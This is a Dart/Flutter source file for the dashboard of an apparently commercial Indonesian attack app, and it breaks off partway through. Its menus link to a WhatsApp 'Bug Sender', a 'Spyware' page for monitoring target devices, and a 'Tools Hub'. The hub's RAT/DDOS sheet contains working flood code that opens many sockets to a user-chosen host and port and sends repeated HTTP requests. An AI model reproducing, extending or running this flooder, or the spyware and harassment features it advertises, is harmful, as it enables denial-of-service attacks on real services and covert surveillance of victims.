import 'dart:convert';
import 'dart:io';
import 'dart:math' as math;
import 'dart:async';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/status.dart' as status;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:video_player/video_player.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:http/http.dart' as http;
import 'package:audioplayers/audioplayers.dart';

import 'nik_check.dart';
import 'admin_page.dart';
import 'owner_page.dart';
import 'home_page.dart';
import 'seller_page.dart';
import 'change_password_page.dart';
import 'tools_gateway.dart';
import 'login_page.dart';
import 'bug_sender.dart';
import 'contact_page.dart';
import 'profile_page.dart';
import 'riwayat_page.dart';
import 'info_page.dart';
import 'device_dashboard.dart';

// ─── Palette ──────────────────────────────────────────────────────────────────
class _C {
  static const bg        = Color(0xFF0A0700);
  static const surface   = Color(0xFF141000);
  static const card      = Color(0xFF1F1800);
  static const border    = Color(0xFF4D3A00);
  static const borderLit = Color(0xFF7A5C00);

  static const red        = Color(0xFFFFD700);
  static const redMid     = Color(0xFFFFE066);
  static const redLight   = Color(0xFFFFF176);
  static const redFrost   = Color(0xFFFFF9C4);

  static const green     = Color(0xFF22C55E);
  static const amber     = Color(0xFFFFC107);
  static const blue      = Color(0xFF1B6FBD);

  static const text      = Color(0xFFFFFDF5);
  static const textSub   = Color(0xFFE6D8A8);
  static const textDim   = Color(0xFF9C8B55);

  static const LinearGradient btnGrad = LinearGradient(
    colors: [redMid, redLight],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

// ─── Role helpers ─────────────────────────────────────────────────────────────
Color _roleColor(String role) {
  switch (role.toLowerCase()) {
    case 'owner':   return const Color(0xFFFFD700);
    case 'moderator':   return const Color(0xFFFFE066);
    case 'partner':   return const Color(0xFFFFF176);
    case 'admin':   return const Color(0xFFFF8F00);
    case 'reseller':return const Color(0xFFFF8F00);
    case 'vip':     return const Color(0xFF22C55E);
    default:        return _C.redLight;
  }
}

IconData _roleIcon(String role) {
  switch (role.toLowerCase()) {
    case 'owner':   return Icons.workspace_premium_rounded;
    case 'moderator':   return Icons.workspace_premium_rounded;
    case 'partner':   return Icons.workspace_premium_rounded;
    case 'admin':   return Icons.admin_panel_settings_rounded;
    case 'reseller':return Icons.storefront_rounded;
    case 'vip':     return Icons.star_rounded;
    default:        return Icons.person_rounded;
  }
}

// ─── Dashboard Page ───────────────────────────────────────────────────────────
class DashboardPage extends StatefulWidget {
  final String username;
  final String password;
  final String role;
  final String expiredDate;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final List<Map<String, dynamic>> listDoos;
  final List<dynamic> news;

  const DashboardPage({
    super.key,
    required this.username,
    required this.password,
    required this.role,
    required this.expiredDate,
    required this.listBug,
    required this.listDoos,
    required this.sessionKey,
    required this.news,
  });

  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage>
    with TickerProviderStateMixin {
  // ── State ────────────────────────────────────────────────────────────────
  late String sessionKey, username, password, role, expiredDate;
  late List<Map<String, dynamic>> listBug, listDoos;
  late List<dynamic> newsList;

  late WebSocketChannel channel;
  String androidId    = 'unknown';
  File?  _profileImage;
  VideoPlayerController? _menuVideoCtrl;

  int _navIndex      = 0;
  Widget _body       = const SizedBox();
  int onlineUsers    = 0;
  int activeConns    = 0;

  // ── Animation controllers ────────────────────────────────────────────────
  late AnimationController _bgCtrl;
  late AnimationController _pageCtrl;
  late AnimationController _drawerHeaderCtrl;

  late Animation<double> _pageFade;
  late Animation<Offset>  _pageSlide;

  // News carousel
  final PageController _newsPageCtrl = PageController(viewportFraction: 0.88);
  int _newsPage = 0;

  @override
  void initState() {
    super.initState();
    sessionKey  = widget.sessionKey;
    username    = widget.username;
    password    = widget.password;
    role        = widget.role;
    expiredDate = widget.expiredDate;
    listBug     = widget.listBug;
    listDoos    = widget.listDoos;
    newsList    = widget.news;

    _bgCtrl = AnimationController(
      vsync: this, duration: const Duration(seconds: 20),
    )..repeat();

    _pageCtrl = AnimationController(
      vsync: this, duration: const Duration(milliseconds: 400),
    );
    _pageFade  = CurvedAnimation(parent: _pageCtrl, curve: Curves.easeOut);
    _pageSlide = Tween<Offset>(begin: const Offset(0, 0.04), end: Offset.zero)
        .animate(CurvedAnimation(parent: _pageCtrl, curve: Curves.easeOutCubic));

    _drawerHeaderCtrl = AnimationController(
      vsync: this, duration: const Duration(milliseconds: 700),
    );

    _body = _newsPage_();
    _pageCtrl.forward();

    _initAndroidId();
    _loadProfileImage();
    _initMenuVideo();
  }

  @override
  void dispose() {
    channel.sink.close(status.goingAway);
    _bgCtrl.dispose();
    _pageCtrl.dispose();
    _drawerHeaderCtrl.dispose();
    _menuVideoCtrl?.dispose();
    _newsPageCtrl.dispose();
    super.dispose();
  }

  // ── Init helpers ──────────────────────────────────────────────────────────
  Future<void> _loadProfileImage() async {
    final prefs = await SharedPreferences.getInstance();
    final path  = prefs.getString('profile_image_$username');
    if (path != null && path.isNotEmpty && mounted) {
      setState(() => _profileImage = File(path));
    }
  }

  void _initMenuVideo() {
    _menuVideoCtrl = VideoPlayerController.asset('assets/videos/banner.mp4')
      ..initialize().then((_) {
        if (mounted) setState(() {});
        _menuVideoCtrl?.setLooping(true);
        _menuVideoCtrl?.play();
      });
  }

  Future<void> _initAndroidId() async {
    final info = await DeviceInfoPlugin().androidInfo;
    androidId = info.id;
    _connectWS();
  }

  void _connectWS() {
    channel = WebSocketChannel.connect(
        Uri.parse('http://viansaja.daiyat19.my.id:1232'));
    channel.sink.add(jsonEncode({
      'type': 'validate', 'key': sessionKey, 'androidId': androidId,
    }));
    channel.sink.add(jsonEncode({'type': 'stats'}));

    channel.stream.listen((event) {
      final data = jsonDecode(event);
      if (data['type'] == 'myInfo' && data['valid'] == false) {
        final reason = data['reason'];
        _handleInvalidSession(reason == 'androidIdMismatch'
            ? 'Akun ini login di perangkat lain.'
            : 'Sesi tidak valid. Silakan login ulang.');
      }
      if (data['type'] == 'stats' && mounted) {
        setState(() {
          onlineUsers  = data['onlineUsers']       ?? 0;
          activeConns  = data['activeConnections'] ?? 0;
        });
      }
    });
  }

  Future<void> _openUrl(String url) async {
    await launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
  }

  void _handleInvalidSession(String message) async {
    await Future.delayed(const Duration(milliseconds: 300));
    final prefs = await SharedPreferences.getInstance();
    await prefs.clear();
    if (!mounted) return;
    _showSystemDialog(
      title: 'Sesi Berakhir',
      message: message,
      icon: Icons.lock_outline_rounded,
      color: _C.red,
      onOk: () => Navigator.of(context).pushAndRemoveUntil(
        MaterialPageRoute(builder: (_) => const LoginPage()),
        (_) => false,
      ),
    );
  }

  // ── Navigation ────────────────────────────────────────────────────────────
  void _navigate(Widget page) {
    setState(() => _body = page);
    _pageCtrl.forward(from: 0);
  }

  void _onNavTap(int index) {
    setState(() => _navIndex = index);
    switch (index) {
      case 0:
        _navigate(_newsPage_());
        break;
      case 1:
        _navigate(HomePage(
          username: username, password: password,
          listBug: listBug, role: role,
          expiredDate: expiredDate, sessionKey: sessionKey,
        ));
        break;
      case 2:
        _navigate(InfoPage(sessionKey: sessionKey));
        break;
      case 3:
        _navigate(const ToolsHubPage()); // ← DIUBAH: pake ToolsHubPage bawaan
        break;
    }
  }

  void _onDrawerNav(int index) {
    Navigator.pop(context);
    switch (index) {
      case 1: _navigate(SellerPage(keyToken: sessionKey)); break;
      case 2: _navigate(AdminPage(sessionKey: sessionKey)); break;
      case 3: _navigate(OwnerPage(sessionKey: sessionKey, username: username)); break;
    }
  }

  // ── System dialog ─────────────────────────────────────────────────────────
  void _showSystemDialog({
    required String title,
    required String message,
    required IconData icon,
    required Color color,
    VoidCallback? onOk,
  }) {
    showGeneralDialog(
      context: context,
      barrierDismissible: false,
      barrierLabel: '',
      barrierColor: Colors.transparent,
      transitionDuration: const Duration(milliseconds: 320),
      transitionBuilder: (_, anim, __, child) => ScaleTransition(
        scale: CurvedAnimation(parent: anim, curve: Curves.easeOutBack),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 28),
        child: Container(
          decoration: BoxDecoration(
            color: _C.card,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: color.withOpacity(0.3), width: 1.5),
            boxShadow: [BoxShadow(color: color.withOpacity(0.15), blurRadius: 50)],
          ),
          padding: const EdgeInsets.all(28),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              width: 56, height: 56,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: color.withOpacity(0.1),
                border: Border.all(color: color.withOpacity(0.3)),
              ),
              child: Icon(icon, color: color, size: 26),
            ),
            const SizedBox(height: 16),
            Text(title,
                style: const TextStyle(
                    color: _C.text, fontSize: 18, fontWeight: FontWeight.w800)),
            const SizedBox(height: 8),
            Text(message,
                textAlign: TextAlign.center,
                style: const TextStyle(
                    color: _C.textSub, fontSize: 13, height: 1.5)),
            const SizedBox(height: 24),
            _GradBtn(label: 'OK', fullWidth: true, onTap: () {
              Navigator.pop(ctx);
              onOk?.call();
            }),
          ]),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // ─── NEWS PAGE (MODIF: TAMBAH TOOLS HUB CARD) ──────────────────────────
  // ═══════════════════════════════════════════════════════════════════════════
  Widget _newsPage_() {
    return SingleChildScrollView(
      physics: const BouncingScrollPhysics(),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const SizedBox(height: 8),

          // ── Stats strip ──────────────────────────────────────────────────
          _StatsStrip(online: onlineUsers, connections: activeConns),
          const SizedBox(height: 20),

          // ── News header ──────────────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: Row(children: [
              Container(
                width: 4, height: 18,
                decoration: BoxDecoration(
                  gradient: _C.btnGrad,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              const SizedBox(width: 10),
              const Text('Berita Terbaru',
                  style: TextStyle(
                      color: _C.text, fontSize: 15, fontWeight: FontWeight.w700)),
              const Spacer(),
              Text('${newsList.length} artikel',
                  style: const TextStyle(color: _C.textSub, fontSize: 11)),
            ]),
          ),
          const SizedBox(height: 14),

          // ── News carousel ────────────────────────────────────────────────
          if (newsList.isNotEmpty) ...[
            SizedBox(
              height: 210,
              child: PageView.builder(
                controller: _newsPageCtrl,
                onPageChanged: (i) => setState(() => _newsPage = i),
                itemCount: newsList.length,
                itemBuilder: (_, i) {
                  final item = newsList[i];
                  final isActive = i == _newsPage;
                  return AnimatedScale(
                    scale: isActive ? 1.0 : 0.94,
                    duration: const Duration(milliseconds: 300),
                    curve: Curves.easeOutCubic,
                    child: _NewsCard(
                      item: item,
                      isActive: isActive,
                    ),
                  );
                },
              ),
            ),
            const SizedBox(height: 12),
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: List.generate(newsList.length, (i) {
                final active = i == _newsPage;
                return AnimatedContainer(
                  duration: const Duration(milliseconds: 250),
                  margin: const EdgeInsets.symmetric(horizontal: 3),
                  width: active ? 20 : 6,
                  height: 6,
                  decoration: BoxDecoration(
                    color: active ? _C.redMid : _C.border,
                    borderRadius: BorderRadius.circular(3),
                  ),
                );
              }),
            ),
          ],

          const SizedBox(height: 24),

          // ── Quick actions header ──────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: Row(children: [
              Container(
                width: 4, height: 18,
                decoration: BoxDecoration(
                  gradient: _C.btnGrad,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              const SizedBox(width: 10),
              const Text('Aksi Cepat',
                  style: TextStyle(
                      color: _C.text, fontSize: 15, fontWeight: FontWeight.w700)),
            ]),
          ),
          const SizedBox(height: 14),

          // ── Telegram join card ───────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: _ActionCard(
              icon: FontAwesomeIcons.telegram,
              iconColor: const Color(0xFF39A7E0),
              iconBg: const Color(0xFF1A4D6E),
              title: 'Info Channel',
              subtitle: 'Join Vatonic Info Channel',
              trailing: const Icon(Icons.arrow_forward_ios_rounded,
                  size: 14, color: _C.textSub),
              onTap: () => _openUrl('https://t.me/ArgaExcnr'),
            ),
          ),
          const SizedBox(height: 12),

          // ── Bug sender card ──────────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: _ActionCard(
              icon: Icons.wifi_tethering_error_rounded,
              iconColor: _C.redLight,
              iconBg: _C.red.withOpacity(0.2),
              title: 'Bug Sender',
              subtitle: 'Kelola WhatsApp sender aktif',
              trailing: Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  gradient: _C.btnGrad,
                  borderRadius: BorderRadius.circular(8),
                ),
                child: const Text('Buka',
                    style: TextStyle(
                        color: Colors.white,
                        fontSize: 11,
                        fontWeight: FontWeight.w700)),
              ),
              onTap: () => Navigator.push(
                context,
                _slideRoute(BugSenderPage(
                    sessionKey: sessionKey, username: username, role: role)),
              ),
            ),
          ),

          const SizedBox(height: 12),

          // ── Spyware card ──────────────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: _ActionCard(
              icon: Icons.phone_android_rounded,
              iconColor: const Color(0xFF8844FF),
              iconBg: const Color(0xFF442288).withOpacity(0.3),
              title: 'Spyware',
              subtitle: 'Kelola device target & monitoring',
              trailing: Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [const Color(0xFF8844FF), const Color(0xFFAA66FF)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: const Text('Buka',
                    style: TextStyle(
                        color: Colors.white,
                        fontSize: 11,
                        fontWeight: FontWeight.w700)),
              ),
              onTap: () => Navigator.push(
                context,
                _slideRoute(DeviceDashboardPage(username: username)),
              ),
            ),
          ),

          const SizedBox(height: 12),

          // ═════════════════════════════════════════════════════════════════
          // ─── 🔥 NEW: TOOLS HUB CARD ─────────────────────────────────────
          // ═════════════════════════════════════════════════════════════════
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: _ActionCard(
              icon: Icons.grid_view_rounded,
              iconColor: const Color(0xFFFF6B6B),
              iconBg: const Color(0xFF6B1A1A).withOpacity(0.3),
              title: '⚡ Tools Hub',
              subtitle: 'DDOS, Jadwal Shalat, GeoIP, Scanner & lebih!',
              trailing: Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [const Color(0xFFFF6B6B), const Color(0xFFFFA94D)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: const Text('Buka',
                    style: TextStyle(
                        color: Colors.white,
                        fontSize: 11,
                        fontWeight: FontWeight.w700)),
              ),
              onTap: () => _showToolsHub(),
            ),
          ),

          const SizedBox(height: 32),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // ─── TOOLS HUB (MODAL SUPER KEREN) ──────────────────────────────────────
  // ═══════════════════════════════════════════════════════════════════════════
  void _showToolsHub() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => DraggableScrollableSheet(
        initialChildSize: 0.92,
        maxChildSize: 0.95,
        minChildSize: 0.6,
        builder: (_, scrollCtrl) => Container(
          decoration: const BoxDecoration(
            color: _C.bg,
            borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
            border: Border(top: BorderSide(color: _C.border)),
          ),
          child: Column(
            children: [
              // ── Handle ──────────────────────────────────────────────────
              Container(
                margin: const EdgeInsets.only(top: 12),
                width: 40, height: 4,
                decoration: BoxDecoration(
                  color: _C.border,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              const SizedBox(height: 12),
              const Text('⚡ Tools Hub',
                  style: TextStyle(
                      color: _C.text, fontSize: 20, fontWeight: FontWeight.w800)),
              const SizedBox(height: 4),
              const Text('Pilih tools yang mau dipakai',
                  style: TextStyle(color: _C.textSub, fontSize: 13)),
              const SizedBox(height: 16),
              Expanded(
                child: GridView.count(
                  controller: scrollCtrl,
                  crossAxisCount: 2,
                  padding: const EdgeInsets.all(16),
                  crossAxisSpacing: 12,
                  mainAxisSpacing: 12,
                  children: [
                    _toolsGridItem(
                      icon: Icons.flash_on_rounded,
                      label: 'DDOS RAT',
                      color: Colors.red.shade700,
                      desc: 'Serangan massal',
                      onTap: () => _openRatTools(ctx),
                    ),
                    _toolsGridItem(
                      icon: Icons.mosque_rounded,
                      label: 'Jadwal Shalat',
                      color: const Color(0xFFFFD700),
                      desc: '+ Adzan',
                      onTap: () => _openSholatTools(ctx),
                    ),
                    _toolsGridItem(
                      icon: Icons.location_on_rounded,
                      label: 'GeoIP Tracker',
                      color: Colors.green.shade600,
                      desc: 'Lacak lokasi IP',
                      onTap: () => _openGeoTools(ctx),
                    ),
                    _toolsGridItem(
                      icon: Icons.search_rounded,
                      label: 'Port Scanner',
                      color: Colors.blue.shade600,
                      desc: 'Scan port terbuka',
                      onTap: () => _openPortScanner(ctx),
                    ),
                    _toolsGridItem(
                      icon: Icons.dns_rounded,
                      label: 'Subdomain Finder',
                      color: Colors.purple.shade600,
                      desc: 'Cari subdomain',
                      onTap: () => _openSubdomainFinder(ctx),
                    ),
                    _toolsGridItem(
                      icon: Icons.devices_rounded,
                      label: 'Device Info',
                      color: Colors.orange.shade700,
                      desc: 'Info perangkat',
                      onTap: () => _showDeviceInfo(ctx),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── TOOLS GRID ITEM ───────────────────────────────────────────────────────
  Widget _toolsGridItem({
    required IconData icon,
    required String label,
    required Color color,
    required String desc,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        decoration: BoxDecoration(
          color: _C.card,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: _C.border),
          boxShadow: [
            BoxShadow(
              color: color.withOpacity(0.08),
              blurRadius: 12,
              offset: const Offset(0, 4),
            ),
          ],
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 48, height: 48,
              decoration: BoxDecoration(
                color: color.withOpacity(0.15),
                borderRadius: BorderRadius.circular(14),
              ),
              child: Icon(icon, color: color, size: 24),
            ),
            const SizedBox(height: 8),
            Text(label,
                style: const TextStyle(
                    color: _C.text, fontSize: 13, fontWeight: FontWeight.w700)),
            const SizedBox(height: 2),
            Text(desc,
                style: const TextStyle(color: _C.textSub, fontSize: 10)),
          ],
        ),
      ),
    );
  }

  // ─── OPEN RAT TOOLS ────────────────────────────────────────────────────────
  void _openRatTools(BuildContext ctx) {
    Navigator.pop(ctx);
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => _RatToolsSheet(sessionKey: sessionKey),
    );
  }

  // ─── OPEN SHOLAT TOOLS ────────────────────────────────────────────────────
  void _openSholatTools(BuildContext ctx) {
    Navigator.pop(ctx);
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => const _SholatToolsSheet(),
    );
  }

  // ─── OPEN GEO TOOLS ───────────────────────────────────────────────────────
  void _openGeoTools(BuildContext ctx) {
    Navigator.pop(ctx);
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => const _GeoToolsSheet(),
    );
  }

  // ─── OPEN PORT SCANNER ────────────────────────────────────────────────────
  void _openPortScanner(BuildContext ctx) {
    Navigator.pop(ctx);
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => const _PortScannerSheet(),
    );
  }

  // ─── OPEN SUBDOMAIN FINDER ───────────────────────────────────────────────
  void _openSubdomainFinder(BuildContext ctx) {
    Navigator.pop(ctx);
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => const _SubdomainFinderSheet(),
    );
  }

  // ─── SHOW DEVICE INFO ────────────────────────────────────────────────────
  void _showDeviceInfo(BuildContext ctx) async {
    Navigator.pop(ctx);
    final info = await DeviceInfoPlugin().androidInfo;
    _showSystemDialog(
      title: '📱 Device Info',
      message: '''
Model: ${info.model}
Brand: ${info.brand}
Android: ${info.version.release}
SDK: ${info.version.sdkInt}
ID: ${info.androidId}
''',
      icon: Icons.devices_rounded,
      color: _C.blue,
    );
  }

  // ──────────────────────────────────────────────────────────────────────────
  // ─── SCAFFOLD ──────────────────────────────────────────────────────────────
  // ──────────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: _buildAppBar(),
      drawer: _buildDrawer(),
      body: Stack(
        children: [
          Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
          SafeArea(
            child: FadeTransition(
              opacity: _pageFade,
              child: SlideTransition(
                position: _pageSlide,
                child: _body,
              ),
            ),
          ),
        ],
      ),
      bottomNavigationBar: _buildBottomNav(),
    );
  }

  // ─── AppBar ────────────────────────────────────────────────────────────────
  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      titleSpacing: 0,
      leading: Builder(builder: (ctx) => _MenuBtn(onTap: () => Scaffold.of(ctx).openDrawer())),
      title: Padding(
        padding: const EdgeInsets.only(left: 4),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              'Halo, $username 👋',
              style: const TextStyle(
                color: _C.text,
                fontSize: 16,
                fontWeight: FontWeight.w700,
                letterSpacing: -0.3,
              ),
            ),
            Row(children: [
              Container(
                width: 6, height: 6,
                decoration: const BoxDecoration(
                  shape: BoxShape.circle, color: _C.green,
                  boxShadow: [BoxShadow(color: Color(0x5522C55E), blurRadius: 6)],
                ),
              ),
              const SizedBox(width: 5),
              Text(
                role.toUpperCase(),
                style: TextStyle(
                  color: _roleColor(role),
                  fontSize: 10,
                  fontWeight: FontWeight.w700,
                  letterSpacing: 1,
                ),
              ),
              const SizedBox(width: 8),
              Text(
                '· Exp: $expiredDate',
                style: const TextStyle(color: _C.textSub, fontSize: 10),
              ),
            ]),
          ],
        ),
      ),
      actions: [
        _AppBarIconBtn(
          icon: Icons.headset_mic_outlined,
          onTap: () => Navigator.push(context, _slideRoute(const ContactPage())),
        ),
        _AppBarIconBtn(
          icon: Icons.account_circle_outlined,
          onTap: () => Navigator.push(
            context,
            _slideRoute(ProfilePage(
              username: username, password: password,
              role: role, expiredDate: expiredDate,
              sessionKey: sessionKey,
            )),
          ),
        ),
        const SizedBox(width: 8),
      ],
    );
  }

  // ─── Bottom Nav ────────────────────────────────────────────────────────────
  Widget _buildBottomNav() {
    final items = [
      _NavItem(icon: Icons.home_rounded, label: 'Home'),
      _NavItem(icon: FontAwesomeIcons.whatsapp, label: 'Bugs'),
      _NavItem(icon: Icons.campaign_rounded, label: 'Info'),
      _NavItem(icon: Icons.grid_view_rounded, label: 'Tools'), // ← DIUBAH
    ];

    return Container(
      decoration: BoxDecoration(
        color: _C.card,
        border: const Border(top: BorderSide(color: _C.border)),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.4),
            blurRadius: 20,
            offset: const Offset(0, -4),
          ),
        ],
      ),
      child: SafeArea(
        top: false,
        child: Padding(
          padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 8),
          child: Row(
            children: items.asMap().entries.map((e) {
              final i      = e.key;
              final item   = e.value;
              final active = _navIndex == i;
              return Expanded(
                child: _NavButton(
                  icon: item.icon,
                  label: item.label,
                  active: active,
                  onTap: () => _onNavTap(i),
                ),
              );
            }).toList(),
          ),
        ),
      ),
    );
  }

  // ─── Drawer ────────────────────────────────────────────────────────────────
  Widget _buildDrawer() {
    return Drawer(
      backgroundColor: Colors.transparent,
      width: MediaQuery.of(context).size.width * 0.78,
      child: Container(
        decoration: const BoxDecoration(
          color: _C.surface,
          border: Border(right: BorderSide(color: _C.border)),
        ),
        child: Column(
          children: [
            _DrawerHeader(
              username: username,
              role: role,
              expiredDate: expiredDate,
              profileImage: _profileImage,
              videoCtrl: _menuVideoCtrl,
            ),
            Expanded(
              child: ListView(
                padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
                children: [
                  if (role == 'reseller')
                    _DrawerItem(
                      icon: Icons.storefront_rounded,
                      label: 'Seller Page',
                      onTap: () => _onDrawerNav(1),
                    ),
                  if (role == 'admin')
                    _DrawerItem(
                      icon: Icons.admin_panel_settings_rounded,
                      label: 'Admin Page',
                      onTap: () => _onDrawerNav(2),
                    ),
                  if (role == 'owner' || role == 'moderator' || role == 'partner')
                    _DrawerItem(
                      icon: Icons.workspace_premium_rounded,
                      label: 'Owner Page',
                      onTap: () => _onDrawerNav(3),
                    ),
                  _DrawerItem(
                    icon: Icons.history_rounded,
                    label: 'Riwayat Aktivitas',
                    onTap: () {
                      Navigator.pop(context);
                      Navigator.push(
                        context,
                        _slideRoute(RiwayatPage(
                            sessionKey: sessionKey, role: role)),
                      );
                    },
                  ),
                  _DrawerItem(
                    icon: Icons.lock_outline_rounded,
                    label: 'Ganti Password',
                    onTap: () {
                      Navigator.pop(context);
                      Navigator.push(
                        context,
                        _slideRoute(ChangePasswordPage(
                            username: username, sessionKey: sessionKey)),
                      );
                    },
                  ),
                ],
              ),
            ),
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 0, 16, 24),
              child: _DrawerItem(
                icon: Icons.logout_rounded,
                label: 'Keluar',
                isDestructive: true,
                onTap: () async {
                  Navigator.pop(context);
                  final prefs = await SharedPreferences.getInstance();
                  await prefs.clear();
                  if (!mounted) return;
                  Navigator.of(context).pushAndRemoveUntil(
                    MaterialPageRoute(builder: (_) => const LoginPage()),
                    (_) => false,
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── SHEET: RAT TOOLS ──────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _RatToolsSheet extends StatefulWidget {
  final String sessionKey;
  const _RatToolsSheet({required this.sessionKey});

  @override
  State<_RatToolsSheet> createState() => __RatToolsSheetState();
}

class __RatToolsSheetState extends State<_RatToolsSheet> {
  final TextEditingController _targetCtrl = TextEditingController();
  final TextEditingController _portCtrl = TextEditingController(text: '80');
  final TextEditingController _threadCtrl = TextEditingController(text: '100');
  bool _isRunning = false;
  int _sent = 0;
  Timer? _timer;
  String _log = '';

  void _startDDoS() {
    if (_targetCtrl.text.isEmpty) {
      setState(() => _log = '❌ Target kosong!');
      return;
    }
    setState(() {
      _isRunning = true;
      _log = '🔥 Menyerang ${_targetCtrl.text}:${_portCtrl.text}';
      _sent = 0;
    });

    final target = _targetCtrl.text;
    final port = int.tryParse(_portCtrl.text) ?? 80;
    final threads = int.tryParse(_threadCtrl.text) ?? 100;

    _timer = Timer.periodic(const Duration(milliseconds: 50), (timer) {
      for (int i = 0; i < threads; i++) {
        try {
          Socket.connect(target, port, timeout: const Duration(seconds: 2))
            .then((s) {
              s.write('GET / HTTP/1.1\r\nHost: $target\r\n\r\n');
              s.flush();
              s.close();
            }).catchError((_) {});
        } catch (_) {}
      }
      setState(() => _sent += threads);
    });
  }

  void _stopDDoS() {
    _timer?.cancel();
    setState(() {
      _isRunning = false;
      _log += ' ⏹️ Dihentikan. Total: $_sent packet';
    });
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      height: MediaQuery.of(context).size.height * 0.7,
      decoration: const BoxDecoration(
        color: _C.bg,
        borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
      ),
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          Container(width: 40, height: 4, decoration: BoxDecoration(color: _C.border, borderRadius: BorderRadius.circular(2))),
          const SizedBox(height: 12),
          const Text('🐀 RAT - DDOS', style: TextStyle(color: _C.text, fontSize: 18, fontWeight: FontWeight.w700)),
          const SizedBox(height: 12),
          _inputField('Target IP/Domain', _targetCtrl),
          _inputField('Port', _portCtrl, isNumber: true),
          _inputField('Thread', _threadCtrl, isNumber: true),
          const SizedBox(height: 12),
          Row(
            children: [
              Expanded(child: ElevatedButton(
                onPressed: _isRunning ? null : _startDDoS,
                style: ElevatedButton.styleFrom(backgroundColor: Colors.red.shade700),
                child: const Text('🚀 START'),
              )),
              const SizedBox(width: 8),
              Expanded(child: ElevatedButton(
                onPressed: _isRunning ? _stopDDoS : null,
                style: ElevatedButton.styleFrom(backgroundColor: Colors.grey.shade800),
                child: const Text('⏹️ STOP'),
              )),
            ],
          ),
          const SizedBox(height: 12),
          Expanded(
            child: Container(
              width: double.infinity,
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: _C.card,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _C.border),
              ),
              child: SingleChildScrollView(
                child: Text(_log, style: const TextStyle(color: Colors.white70)),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _inputField(String label, TextEditingController ctrl, {bool isNumber = false}) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: TextField(
        controller: ctrl,
